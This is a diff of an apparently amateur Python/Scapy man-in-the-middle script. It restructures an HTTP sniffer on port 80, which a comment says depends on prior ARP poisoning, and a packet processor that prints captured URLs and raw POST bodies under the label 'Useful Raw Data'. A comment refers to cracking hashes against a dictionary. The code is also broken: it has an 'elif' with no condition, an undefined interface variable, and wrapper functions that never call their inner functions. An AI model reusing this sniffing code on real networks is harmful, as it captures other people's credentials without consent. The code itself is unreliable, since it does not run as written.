@@ -123,29 +123,32 @@ def mitm():
 
 # Packet Sniff
 # Scans for port 80 HTTP requests. ARP will need to be beforehand. 
-def sniff_packets(iface):
-    # Sniff 80 port packets with iface
-    if iface:
-        # port 80 for http
-        sniff(filter="port 80", prn=process_packet, iface=textInterface, store=False)
-	#process_packet(packet)
-    elif:
-        # sniff with default interface
-        sniff(filter="port 80", prn=process_packet, store=False)
-	#process_packet(packet)
-    else: 
-	pass
+def sniffer():
+	
+	def sniff_packets(iface):
+	    # Sniff 80 port packets with iface
+	    if iface:
+		# port 80 for http
+		sniff(filter="port 80", prn=process_packet, iface=textInterface, store=False)
+		#process_packet(packet)
+	    elif:
+		# sniff with default interface
+		sniff(filter="port 80", prn=process_packet, store=False)
+		#process_packet(packet)
+	    else: 
+		pass
 
-#Whenever a packet is sniffed, this will need to be excuted
-
-def process_packet(packet):
-    if packet.haslayer(HTTPRequest):
-        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
-        ip = packet[IP].src
-        method = packet[HTTPRequest].Method.decode()
-        print(f"{ip} Requested {url} with {method}{packetsniffer.RESET}")
-        if packetsniffer.show_raw and packet.haslayer(Raw) and method == "POST":
-            print(f"Useful Raw Data: {packet[Raw].load}{packetsniffer.RESET}")
+	#Whenever a packet is sniffed, this will need to be excuted
+def packet_processor():
+	
+	def process_packet(packet):
+	    if packet.haslayer(HTTPRequest):
+		url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+		ip = packet[IP].src
+		method = packet[HTTPRequest].Method.decode()
+		print(f"{ip} Requested {url} with {method}{packetsniffer.RESET}")
+		if packetsniffer.show_raw and packet.haslayer(Raw) and method == "POST":
+		    print(f"Useful Raw Data: {packet[Raw].load}{packetsniffer.RESET}")
 
 # if packet is successful, get hash as a string and compare it to dictionary
 
